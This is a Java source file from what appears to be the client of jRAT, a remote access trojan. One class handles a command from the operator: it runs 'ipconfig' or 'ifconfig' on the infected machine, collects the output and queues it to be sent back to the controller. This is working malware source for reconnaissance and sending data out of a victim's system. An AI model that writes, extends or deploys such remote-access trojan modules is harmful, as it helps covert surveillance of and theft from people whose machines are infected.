package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.packets.outgoing.Packet50IPConfig;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import oslib.OperatingSystem;


public class Packet72IPConfig extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		Process p = Runtime.getRuntime().exec(OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS ? "ipconfig" : "ifconfig");

		BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

		int n = 0;

		String ipconfig = "";

		while (true) {
			String line = reader.readLine();
			if (n > 5) {
				break;
			}
			if (line == null) {
				ipconfig += " \n";
				n++;
			} else {
				ipconfig += line + "\n";
				n = 0;
			}
		}
		reader.close();

		con.addToSendQueue(new Packet50IPConfig(ipconfig));
	}

}
